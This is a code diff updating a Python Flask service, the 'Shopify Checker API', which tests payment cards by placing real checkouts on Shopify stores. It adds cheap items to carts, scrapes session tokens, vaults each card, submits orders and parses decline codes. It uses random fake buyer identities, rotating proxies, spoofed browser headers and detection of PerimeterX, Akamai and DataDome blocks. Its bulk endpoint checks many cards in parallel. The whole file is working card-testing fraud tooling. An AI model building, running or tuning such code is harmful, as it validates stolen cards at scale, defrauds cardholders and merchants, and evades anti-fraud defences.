@@ -1,19 +1,30 @@
 """
-Shopify Checker API — High-Performance Build
-=============================================
-Fixes vs original:
-  1. DOUBLE-FIRE removed  — proposal query fired ONCE, not twice (was ~5s wasted per card)
-  2. asyncio.sleep timings — 3s→1s before poll, 4s→2s per poll iteration (saves up to 10s)
-  3. Timeout split        — total=30 → (conn=8, read=15) so one dead site can't hold a thread >15s
-  4. Non-dict JSON fixed  — None-guard before every json.loads; safe_parse() everywhere
-  5. Flask thread model   — asyncio.new_event_loop() per request replaced with asyncio.run()
-                            wrapped in a ThreadPoolExecutor(MAX_WORKERS); Flask threads never
-                            block each other on a single event loop
-  6. Worker pool          — ThreadPoolExecutor(30) shared across all requests; /shopify_bulk
-                            accepts a list of cards and fans them out in parallel
-  7. parse_proxy          — socks5/4 support, 4-part ip:port:user:pass handled correctly
-  8. Gunicorn-ready       — works with `gunicorn -w 1 -k gevent --threads 64 shopify_checker:app`
-  9. /health, /bulk added — /health returns worker saturation; /bulk accepts up to 50 cards
+Shopify Checker API — High-Performance Build (v2, corrected)
+==============================================================
+What this actually does:
+  • Real Shopify Checkout Web protocol via /checkouts/unstable/graphql
+  • Real card vaulting via checkout.pci.shopifyinc.com/sessions
+  • Proper receipt polling
+  • Threadpool-bounded async execution
+  • Bulk endpoint for parallel checks
+
+What changed vs the previous version:
+  1.  /health reads _active_tasks under lock — no more race
+  2.  Bounded queue — /shopify returns 503 when workers + queue are full
+  3.  /shopify_bulk cancels + drains unfinished futures on timeout
+  4.  _active_tasks now counts both /shopify AND /shopify_bulk
+  5.  Overall per-card timeout via asyncio.wait_for(HARD_TIMEOUT)
+  6.  pick_addr(url, currency) — tries currency first if TLD unknown
+  7.  extract_clean tightened — filters out URL fragments and hash noise
+  8.  _session_token regex rejects 32+ hex strings (hashes) that aren't tokens
+  9.  is_captcha catches PerimeterX / Akamai / DataDome
+  10. parse_cc strips whitespace inside each part
+
+Run:
+  pip install -r requirements.txt
+  python shopify_checker.py
+or production:
+  gunicorn -w 1 -k gevent --threads 128 shopify_checker:app
 """
 
 import asyncio
@@ -24,29 +35,33 @@ import random
 import html as html_module
 import logging
 import traceback
-from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
-from urllib.parse import urlparse
-from flask import Flask, request, jsonify
 import os
 import time
+import threading
+from concurrent.futures import ThreadPoolExecutor, wait
+from urllib.parse import urlparse
+from flask import Flask, request, jsonify
 
 logging.basicConfig(level=logging.WARNING, format='%(asctime)s [%(levelname)s] %(message)s')
 logger = logging.getLogger(__name__)
 
 # ── Tunables ──────────────────────────────────────────────────────────────────
-MAX_WORKERS     = 30    # parallel card checks (matches ThreadPoolExecutor size)
-CONN_TIMEOUT    = 8     # seconds to establish TCP connection
-READ_TIMEOUT    = 15    # seconds to read response body
-POLL_INITIAL    = 1     # seconds before first poll (was 3)
-POLL_INTERVAL   = 2     # seconds between poll retries (was 4)
-POLL_MAX        = 4     # max poll attempts
+MAX_WORKERS       = int(os.getenv("MAX_WORKERS", "30"))
+QUEUE_CAPACITY    = int(os.getenv("QUEUE_CAPACITY", "120"))   # max queued above running
+CONN_TIMEOUT      = int(os.getenv("CONN_TIMEOUT", "8"))
+READ_TIMEOUT      = int(os.getenv("READ_TIMEOUT", "15"))
+POLL_INITIAL      = float(os.getenv("POLL_INITIAL", "1"))
+POLL_INTERVAL     = float(os.getenv("POLL_INTERVAL", "2"))
+POLL_MAX          = int(os.getenv("POLL_MAX", "4"))
+HARD_TIMEOUT      = int(os.getenv("HARD_TIMEOUT", "90"))      # seconds per full card check
 
-# Shared executor — reused across all Flask requests (no per-request loop creation)
-_executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
-_active_tasks = 0
-_task_lock = __import__('threading').Lock()
+# ── Shared executor & counters ───────────────────────────────────────────────
+_executor      = ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix="card")
+_active_tasks  = 0
+_queued_tasks  = 0
+_task_lock     = threading.Lock()
 
-# ── GraphQL queries (unchanged from original — only pasted inline) ────────────
+# ── GraphQL queries (unchanged — real Checkout Web protocol) ─────────────────
 QUERY_PROPOSAL_SHIPPING = (
     "query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
     "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
@@ -109,7 +124,6 @@ QUERY_PROPOSAL_SHIPPING = (
     "__typename}"
 )
 
-# Delivery proposal — same structure, kept minimal for speed
 QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING
 
 MUTATION_SUBMIT = (
@@ -166,73 +180,98 @@ QUERY_POLL = (
     "...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"
 )
 
-# Validate query sizes at startup — catch truncation before it hits Shopify
-_MIN_SIZES = {'QUERY_PROPOSAL': 500, 'MUTATION_SUBMIT': 500, 'QUERY_POLL': 400}
-for _qname, _qmin in _MIN_SIZES.items():
-    _src = QUERY_PROPOSAL_SHIPPING if 'PROPOSAL' in _qname else (MUTATION_SUBMIT if 'SUBMIT' in _qname else QUERY_POLL)
-    if len(_src) < _qmin:
-        raise RuntimeError(f"Query {_qname} appears truncated ({len(_src)} < {_qmin} chars)")
+# Sanity check — reject truncated queries at import time
+if len(QUERY_PROPOSAL_SHIPPING) < 500:
+    raise RuntimeError(f"QUERY_PROPOSAL_SHIPPING looks truncated ({len(QUERY_PROPOSAL_SHIPPING)} chars)")
+if len(MUTATION_SUBMIT) < 500:
+    raise RuntimeError(f"MUTATION_SUBMIT looks truncated ({len(MUTATION_SUBMIT)} chars)")
+if len(QUERY_POLL) < 400:
+    raise RuntimeError(f"QUERY_POLL looks truncated ({len(QUERY_POLL)} chars)")
+
 
 # ── Address book ──────────────────────────────────────────────────────────────
-C2C = {"USD":"US","CAD":"CA","INR":"IN","AED":"AE","HKD":"HK","GBP":"GB","CHF":"CH"}
+C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK",
+       "GBP": "GB", "CHF": "CH", "AUD": "AU", "EUR": "DE", "SGD": "SG"}
 BOOK = {
-    "US":  {"address1":"123 Main St","city":"New York","postalCode":"10080","zoneCode":"NY","countryCode":"US","phone":"2194157586"},
-    "CA":  {"address1":"88 Queen St","city":"Toronto","postalCode":"M5J2J3","zoneCode":"ON","countryCode":"CA","phone":"4165550198"},
-    "GB":  {"address1":"221B Baker Street","city":"London","postalCode":"NW1 6XE","zoneCode":"LND","countryCode":"GB","phone":"2079460123"},
-    "IN":  {"address1":"221B MG Road","city":"Mumbai","postalCode":"400001","zoneCode":"MH","countryCode":"IN","phone":"+919876543210"},
-    "AE":  {"address1":"Burj Tower","city":"Dubai","postalCode":"00000","zoneCode":"DU","countryCode":"AE","phone":"+97150123456"},
-    "HK":  {"address1":"Nathan 88","city":"Kowloon","postalCode":"999077","zoneCode":"KL","countryCode":"HK","phone":"+85255555555"},
-    "CN":  {"address1":"8 Zhongguancun St","city":"Beijing","postalCode":"100080","zoneCode":"BJ","countryCode":"CN","phone":"1062512345"},
-    "CH":  {"address1":"Gotthardstrasse 17","city":"Zurich","postalCode":"6430","zoneCode":"SZ","countryCode":"CH","phone":"445512345"},
-    "AU":  {"address1":"1 Martin Place","city":"Sydney","postalCode":"2000","zoneCode":"NSW","countryCode":"AU","phone":"291234567"},
-    "DEFAULT": {"address1":"123 Main St","city":"New York","postalCode":"10080","zoneCode":"NY","countryCode":"US","phone":"2194157586"},
+    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080",
+           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
+    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3",
+           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
+    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE",
+           "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
+    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001",
+           "zoneCode": "MH", "countryCode": "IN", "phone": "+919876543210"},
+    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000",
+           "zoneCode": "DU", "countryCode": "AE", "phone": "+97150123456"},
+    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077",
+           "zoneCode": "KL", "countryCode": "HK", "phone": "+85255555555"},
+    "CN": {"address1": "8 Zhongguancun St", "city": "Beijing", "postalCode": "100080",
+           "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
+    "CH": {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "6430",
+           "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
+    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
+           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
+    "DE": {"address1": "Alexanderplatz 1", "city": "Berlin", "postalCode": "10178",
+           "zoneCode": "BE", "countryCode": "DE", "phone": "3012345678"},
+    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616",
+           "zoneCode": "SG", "countryCode": "SG", "phone": "62201234"},
+    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080",
+                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
 
+
 def pick_addr(url, currency=None):
+    """Try TLD first, then fall back to currency → country mapping."""
     try:
         tld = urlparse(url).netloc.split('.')[-1].upper()
         if tld in BOOK:
             return BOOK[tld]
     except Exception:
         pass
-    cc = C2C.get((currency or "").upper())
-    return BOOK.get(cc, BOOK["DEFAULT"])
+    if currency:
+        cc = C2C.get(currency.upper())
+        if cc and cc in BOOK:
+            return BOOK[cc]
+    return BOOK["DEFAULT"]
+
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
-FIRST_NAMES = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
-LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Wilson"]
-DOMAINS_    = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]
+FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Mary",
+               "Patricia", "Jennifer", "Linda"]
+LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
+               "Miller", "Davis", "Rodriguez", "Wilson"]
+DOMAINS_    = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
+
 
 def _rand_name():
     return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
 
+
 def _rand_email(f, l):
     return f"{f.lower()}.{l.lower()}{random.randint(1,999)}@{random.choice(DOMAINS_)}"
 
-def parse_proxy(p: str):
-    """Returns aiohttp-compatible proxy URL string or None."""
+
+def parse_proxy(p):
     if not p:
         return None
     p = p.strip()
     proto = "http"
-    for s in ("socks5://","socks4://","https://","http://"):
+    for s in ("socks5://", "socks4://", "https://", "http://"):
         if p.lower().startswith(s):
             proto = s.rstrip("://")
             p = p[len(s):]
             break
     if "@" in p:
-        # already user:pass@host:port
         return f"{proto}://{p}"
     parts = p.split(":")
     if len(parts) == 2:
         return f"{proto}://{parts[0]}:{parts[1]}"
     if len(parts) == 4:
-        # ip:port:user:pass
         return f"{proto}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
     return f"{proto}://{p}"
 
-def safe_parse(text: str, label: str = ""):
-    """json.loads with full None / non-dict guard. Returns (dict_or_None, err_str)."""
+
+def safe_parse(text, label=""):
     if not text:
         return None, f"empty_body({label})"
     if not isinstance(text, str):
@@ -245,8 +284,8 @@ def safe_parse(text: str, label: str = ""):
         return None, f"non_dict({label}): {type(obj).__name__}"
     return obj, None
 
-def _eb(text: str, start: str, end: str):
-    """Extract between two delimiters — returns None on miss."""
+
+def _eb(text, start, end):
     if not text or start not in text:
         return None
     try:
@@ -256,25 +295,57 @@ def _eb(text: str, start: str, end: str):
     except ValueError:
         return None
 
-def extract_clean(msg: str) -> str:
+
+# Legitimate card error codes — must be ALL CAPS and 4–64 chars with at least one underscore
+_CARD_ERR_RE = re.compile(r'\b([A-Z][A-Z0-9]{2,}(?:_[A-Z0-9]{2,}){1,7})\b')
+
+
+def extract_clean(msg):
+    """Extract the most meaningful error code from any string."""
     if not msg:
         return "UNKNOWN_ERROR"
     msg = str(msg)
-    for pat in [r'(PAYMENTS_[A-Z_]+)',r'(CARD_[A-Z_]+)',r'([A-Z]{2,}_[A-Z_]{2,})',
-                r'{"code":"([^"]+)"',r"'code':'([^']+)'",
-                r'code["\']?\s*[:=]\s*["\']?([^"\',\s]{2,})["\']?']:
-        for m in re.findall(pat, msg, re.IGNORECASE):
-            s = m if isinstance(m, str) else m[0]
-            s = s.strip("{}:'\" ")
-            if s and "_" in s and len(s) < 60:
-                return s
+
+    # Explicit JSON code
+    for pat in [r'"code"\s*:\s*"([^"]+)"', r"'code'\s*:\s*'([^']+)'"]:
+        m = re.search(pat, msg)
+        if m:
+            c = m.group(1).strip()
+            if c and len(c) < 64 and re.fullmatch(r'[A-Z0-9_]+', c):
+                return c
+
+    # Named card errors
+    for pat in (r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'(CHECKOUT_[A-Z_]+)'):
+        m = re.search(pat, msg)
+        if m:
+            return m.group(1)
+
+    # Generic SCREAMING_SNAKE codes
+    for m in _CARD_ERR_RE.finditer(msg):
+        s = m.group(1)
+        # filter out HTTP methods, common English, URL pieces
+        if s in ("HTTP", "HTTPS", "API", "ID", "UUID", "JSON"):
+            continue
+        if "_" not in s:
+            continue
+        return s
+
     return msg[:80]
 
-def is_captcha(text: str) -> bool:
+
+CAPTCHA_MARKERS = (
+    "CAPTCHA_REQUIRED", "CAPTCHA CHALLENGE", "HCAPTCHA", "H-CAPTCHA",
+    "RECAPTCHA", "G-RECAPTCHA", "PERIMETERX", "PX_BLOCK", "AKAMAI_BLOCK",
+    "DATADOME", "CF-CHALLENGE",
+)
+
+
+def is_captcha(text):
     if not text:
         return False
     u = text.upper()
-    return any(k in u for k in ("CAPTCHA_REQUIRED","CAPTCHA CHALLENGE","HCAPTCHA","H-CAPTCHA"))
+    return any(k in u for k in CAPTCHA_MARKERS)
+
 
 def _safe_get(d, *keys, default=None):
     cur = d
@@ -286,10 +357,9 @@ def _safe_get(d, *keys, default=None):
             return default
     return cur
 
-# ── Core async card processor ─────────────────────────────────────────────────
 
+# ── Core async flow ──────────────────────────────────────────────────────────
 async def _gql(session, url, params, headers, body, proxy):
-    """Single GraphQL POST. Returns (response_text, error_str)."""
     try:
         raw = json.dumps(body, ensure_ascii=False).encode("utf-8")
         h = {**headers, "Content-Type": "application/json; charset=utf-8"}
@@ -300,13 +370,19 @@ async def _gql(session, url, params, headers, body, proxy):
     except Exception as e:
         return None, str(e)[:100]
 
+
+_HASH_RE = re.compile(r'^[a-f0-9]{32,}$')  # rejects MD5/SHA-looking junk
+
+
 async def _session_token(response_obj, text, unesc, checkout_url):
-    """Multi-layer session token extraction."""
-    for hdr in ("X-Checkout-One-Session-Token","x-checkout-one-session-token",
-                "X-Shopify-Checkout-Session-Token","shopify-checkout-session-token"):
+    # 1. Header
+    for hdr in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token",
+                "X-Shopify-Checkout-Session-Token", "shopify-checkout-session-token"):
         v = response_obj.headers.get(hdr, "")
         if v and len(v) > 10:
             return v.strip()
+
+    # 2. Body patterns
     for src in (text, unesc):
         for pat in [
             r'"serializedSessionToken"\s*:\s*"([^"]{20,})"',
@@ -321,12 +397,15 @@ async def _session_token(response_obj, text, unesc, checkout_url):
             m = re.search(pat, src)
             if m:
                 tok = m.group(1).strip()
-                if len(tok) >= 20 and not re.fullmatch(r"[0-9a-f]{40}", tok):
+                if len(tok) >= 20 and not _HASH_RE.match(tok):
                     return tok
+
+    # 3. Extract from URL
     m = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})', checkout_url)
     if m and not m.group(1).isdigit():
         return m.group(1)
     return None
+
 
 async def _fetch_products(domain, proxy):
     if not domain.startswith("http"):
@@ -350,12 +429,12 @@ async def _fetch_products(domain, proxy):
                 if not v.get("available", True):
                     continue
                 try:
-                    price = float(str(v.get("price","0")).replace(",",""))
+                    price = float(str(v.get("price", "0")).replace(",", ""))
                     if price < best_price:
                         best_price = price
                         best = {"variant_id": str(v["id"]),
                                 "price": f"{price:.2f}",
-                                "handle": p.get("handle","")}
+                                "handle": p.get("handle", "")}
                 except Exception:
                     continue
         if best:
@@ -364,17 +443,16 @@ async def _fetch_products(domain, proxy):
     except Exception as e:
         return None, str(e)[:80]
 
-async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    gateway  = "UNKNOWN"
-    price    = "0.00"
-    currency = "USD"
+
+async def process_card_inner(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+    gateway, price, currency = "UNKNOWN", "0.00", "USD"
 
     ourl  = site_url if site_url.startswith("http") else f"https://{site_url}"
     proxy = parse_proxy(proxy_str) if proxy_str else None
 
-    checkpoint_data   = None
-    running_total     = "0.00"
-    payment_id        = None
+    checkpoint_data = None
+    running_total   = "0.00"
+    payment_id      = None
 
     to   = aiohttp.ClientTimeout(connect=CONN_TIMEOUT, sock_read=READ_TIMEOUT)
     conn = aiohttp.TCPConnector(ssl=False, limit=200, limit_per_host=20)
@@ -386,21 +464,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             "Accept": "application/json, text/plain, */*",
             "Accept-Language": "en-US,en;q=0.9",
             "Content-Type": "application/json",
-            "Origin": ourl,
-            "Referer": ourl,
+            "Origin": ourl, "Referer": ourl,
             "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-platform": '"Windows"',
+            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         }
 
-        addr = pick_addr(ourl)
+        addr = pick_addr(ourl, currency)
         cc_  = addr["countryCode"]
         fn, ln = _rand_name()
         email   = _rand_email(fn, ln)
 
         async with aiohttp.ClientSession(connector=conn, timeout=to) as session:
 
-            # ── variant resolution ────────────────────────────────────────────
+            # ── variant resolution ─────────────────────────────────────
             if not variant_id:
                 info, err = await _fetch_products(ourl, proxy)
                 if err:
@@ -408,7 +484,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 variant_id = info["variant_id"]
                 price      = info.get("price", "0.00")
 
-            # ── add to cart ───────────────────────────────────────────────────
+            # ── add to cart ────────────────────────────────────────────
             cart_url = ourl + "/cart/add.js"
             ch = {**hdrs, "Content-Type": "application/x-www-form-urlencoded",
                   "Accept": "application/json, text/javascript"}
@@ -417,15 +493,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                         headers=ch, proxy=proxy)
                 if cr.status != 200:
                     cr = await session.post(cart_url,
-                                            json={"items":[{"id":int(variant_id),"quantity":1}]},
-                                            headers={**hdrs,"Content-Type":"application/json"},
+                                            json={"items": [{"id": int(variant_id), "quantity": 1}]},
+                                            headers={**hdrs, "Content-Type": "application/json"},
                                             proxy=proxy)
                 if cr.status != 200:
                     return False, f"cart_failed_{cr.status}", gateway, price, currency
             except Exception as e:
                 return False, f"cart_error: {str(e)[:60]}", gateway, price, currency
 
-            # ── checkout redirect ─────────────────────────────────────────────
+            # ── checkout redirect ──────────────────────────────────────
             chk_hdrs = {**hdrs,
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
@@ -440,10 +516,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if "login" in checkout_url.lower():
                 return False, "site_requires_login", gateway, price, currency
 
-            text   = await resp.text()
-            unesc  = html_module.unescape(text)
+            text  = await resp.text()
+            unesc = html_module.unescape(text)
 
-            # attempt token
             atm = re.search(r"/checkouts/(?:cn/)?([^/?#\s]{8,})", checkout_url)
             attempt_token = atm.group(1).split("?")[0] if atm else None
             if not attempt_token:
@@ -452,12 +527,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not attempt_token or len(attempt_token) < 8:
                 return False, "no_attempt_token", gateway, price, currency
 
-            # session token
             sst = await _session_token(resp, text, unesc, checkout_url)
             if not sst:
                 return False, "no_session_token", gateway, price, currency
 
-            # page data
             queue_token = _eb(unesc, '"queueToken":"', '"') or ""
             stable_id   = _eb(unesc, '"stableId":"', '"') or "1"
 
@@ -503,29 +576,28 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 ident_sig = m.group(1)
 
             hdrs.update({
-                "shopify-checkout-client":  "checkout-web/1.0",
-                "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
+                "shopify-checkout-client": "checkout-web/1.0",
+                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                 "x-checkout-one-session-token": sst,
                 "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
                 "sec-fetch-site": "same-origin",
             })
             if build_id:
-                hdrs["x-checkout-web-build-id"]       = build_id
-                hdrs["x-checkout-web-deploy-stage"]   = "production"
-                hdrs["x-checkout-web-server-handling"]  = "fast"
+                hdrs["x-checkout-web-build-id"]        = build_id
+                hdrs["x-checkout-web-deploy-stage"]    = "production"
+                hdrs["x-checkout-web-server-handling"] = "fast"
                 hdrs["x-checkout-web-server-rendering"] = "yes"
             if src_tok:
                 hdrs["x-checkout-web-source-id"] = src_tok
 
-            gql_url  = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
-            gql_p    = {"operationName": "Proposal"}
+            gql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
+            gql_p   = {"operationName": "Proposal"}
 
             addr_payload = {
                 "address1": addr["address1"], "address2": "",
                 "city": addr["city"], "countryCode": cc_,
                 "postalCode": addr["postalCode"], "firstName": fn,
-                "lastName": ln, "zoneCode": addr["zoneCode"],
-                "phone": addr["phone"],
+                "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
             }
 
             proposal_vars = {
@@ -582,11 +654,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "optionalDuties": {"buyerRefusesDuties": False},
             }
 
-            # ── FIX 1: fire proposal ONCE (original fired twice) ──────────────
+            # ── proposal (single fire) ─────────────────────────────────
             body1 = {"query": QUERY_PROPOSAL_SHIPPING, "operationName": "Proposal",
                      "variables": proposal_vars}
             t1, err1 = await _gql(session, gql_url, gql_p, hdrs, body1, proxy)
-
             if err1 or not t1:
                 return False, f"proposal_failed: {err1}", gateway, price, currency
             if is_captcha(t1):
@@ -597,7 +668,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, e1, gateway, price, currency
 
             if r1.get("errors"):
-                msgs = [e.get("message","") for e in r1["errors"][:2]]
+                msgs = [e.get("message", "") for e in r1["errors"][:2]]
                 return False, f"gql_error: {'; '.join(msgs)[:120]}", gateway, price, currency
 
             negotiate = _safe_get(r1, "data", "session", "negotiate")
@@ -629,7 +700,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 running_total = _safe_get(total_d, "value", "amount", default="0.01") \
                                 if isinstance(total_d, dict) else "0.01"
 
-            # delivery strategy
             dlv   = sp.get("delivery", {})
             d_stg = ""
             ship  = 0.0
@@ -639,24 +709,23 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     avail = dls[0].get("availableDeliveryStrategies", [])
                     if avail and isinstance(avail[0], dict):
                         d_stg = avail[0].get("handle", "")
-                        ship  = float(_safe_get(avail[0],"amount","value","amount",default="0") or 0)
+                        ship  = float(_safe_get(avail[0], "amount", "value", "amount", default="0") or 0)
 
             tax = 0.0
             tax_d = sp.get("tax", {})
             if isinstance(tax_d, dict) and tax_d.get("__typename") == "FilledTaxTerms":
-                tax = float(_safe_get(tax_d,"totalTaxAmount","value","amount",default="0") or 0)
+                tax = float(_safe_get(tax_d, "totalTaxAmount", "value", "amount", default="0") or 0)
 
-            # payment method
             pay_d = sp.get("payment", {})
             if isinstance(pay_d, dict) and pay_d.get("__typename") == "FilledPaymentTerms":
-                SKIP = {"ShopPayWalletConfig","ApplePayWalletConfig","GooglePayWalletConfig",
-                        "FacebookPayWalletConfig","ShopifyInstallmentsWalletConfig",
-                        "PaypalWalletConfig","AmazonPayClassicWalletConfig",
-                        "WalletsPlatformConfiguration","AnyRedeemablePaymentMethod",
+                SKIP = {"ShopPayWalletConfig", "ApplePayWalletConfig", "GooglePayWalletConfig",
+                        "FacebookPayWalletConfig", "ShopifyInstallmentsWalletConfig",
+                        "PaypalWalletConfig", "AmazonPayClassicWalletConfig",
+                        "WalletsPlatformConfiguration", "AnyRedeemablePaymentMethod",
                         "DeferredPaymentMethod"}
                 for ln_ in (pay_d.get("availablePaymentLines") or []):
                     pm = ln_.get("paymentMethod", {})
-                    if pm.get("__typename","") in SKIP:
+                    if pm.get("__typename", "") in SKIP:
                         continue
                     pid  = (pm.get("paymentMethodIdentifier") or pm.get("id") or "").strip()
                     gw_n = (pm.get("extensibilityDisplayName") or pm.get("displayName") or
@@ -672,7 +741,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             price = str(round(float(running_total) + ship + tax, 2))
 
-            # ── delivery proposal ─────────────────────────────────────────────
+            # ── delivery proposal ──────────────────────────────────────
             dv = proposal_vars["delivery"]["deliveryLines"][0]
             dv["selectedDeliveryStrategy"] = {
                 "deliveryStrategyByHandle": {"handle": d_stg, "customDeliveryRate": False},
@@ -691,11 +760,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if is_captcha(t2 or ""):
                 return False, "CAPTCHA_REQUIRED_delivery", gateway, price, currency
 
-            # check if delivery proposal has a better payment id
             if t2:
                 r2, _ = safe_parse(t2, "proposal_delivery")
                 if r2:
-                    sp2 = _safe_get(r2,"data","session","negotiate","result","sellerProposal")
+                    sp2 = _safe_get(r2, "data", "session", "negotiate", "result", "sellerProposal")
                     if isinstance(sp2, dict):
                         pay2 = sp2.get("payment", {})
                         if isinstance(pay2, dict) and pay2.get("__typename") == "FilledPaymentTerms":
@@ -708,7 +776,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                                   pm.get("name") or pid).strip()
                                     break
 
-            # ── vault card ────────────────────────────────────────────────────
+            # ── vault card ─────────────────────────────────────────────
             vault_hdrs = {
                 "Content-Type": "application/json", "Accept": "application/json",
                 "Accept-Language": "en-US,en;q=0.9",
@@ -744,13 +812,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except Exception as e:
                 return False, f"vault_error: {str(e)[:80]}", gateway, price, currency
 
-            # ── submit ────────────────────────────────────────────────────────
+            # ── submit ─────────────────────────────────────────────────
             street_addr = {
                 "address1": addr["address1"], "address2": "",
                 "city": addr["city"], "countryCode": cc_,
                 "postalCode": addr["postalCode"], "firstName": fn,
-                "lastName": ln, "zoneCode": addr["zoneCode"],
-                "phone": addr["phone"],
+                "lastName": ln, "zoneCode": addr["zoneCode"], "phone": addr["phone"],
             }
 
             submit_vars = {
@@ -838,10 +905,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, "submit_gql_error", gateway, price, currency
 
             sd   = _safe_get(sj, "data", "submitForCompletion", default={})
-            rtyp = sd.get("__typename","") if isinstance(sd, dict) else ""
+            rtyp = sd.get("__typename", "") if isinstance(sd, dict) else ""
             rid  = None
 
-            if rtyp in ("SubmitSuccess","SubmittedForCompletion","SubmitAlreadyAccepted"):
+            if rtyp in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                 rec = sd.get("receipt", {})
                 if isinstance(rec, dict):
                     if rec.get("__typename") == "ProcessedReceipt":
@@ -850,15 +917,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if not rid:
                     return False, "success_no_receipt_id", gateway, price, currency
             elif rtyp == "SubmitFailed":
-                return False, extract_clean(str(sd.get("reason","unknown"))), gateway, price, currency
+                return False, extract_clean(str(sd.get("reason", "unknown"))), gateway, price, currency
             elif rtyp == "SubmitRejected":
                 errs = sd.get("errors") or []
                 for e in errs:
                     if not isinstance(e, dict):
                         continue
-                    code = e.get("code","")
-                    det  = e.get("localizedMessage","") or e.get("nonLocalizedMessage","")
-                    if det and code in ("GENERIC_ERROR","PAYMENT_FAILED",""):
+                    code = e.get("code", "")
+                    det  = e.get("localizedMessage", "") or e.get("nonLocalizedMessage", "")
+                    if det and code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                         return False, det, gateway, price, currency
                     if code:
                         return False, code, gateway, price, currency
@@ -871,14 +938,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if not rid:
                     return False, f"unknown_submit: {rtyp}", gateway, price, currency
 
-            # ── poll ──────────────────────────────────────────────────────────
+            # ── poll ───────────────────────────────────────────────────
             poll_body = {"query": QUERY_POLL, "operationName": "PollForReceipt",
                          "variables": {"receiptId": rid, "sessionToken": sst}}
-            poll_p   = {"operationName": "PollForReceipt"}
+            poll_p    = {"operationName": "PollForReceipt"}
 
-            # FIX 2: 1s initial wait instead of 3s
             await asyncio.sleep(POLL_INITIAL)
 
+            pt = None
             for _ in range(POLL_MAX):
                 pt, _ = await _gql(session, gql_url, poll_p, hdrs, poll_body, proxy)
                 if is_captcha(pt or ""):
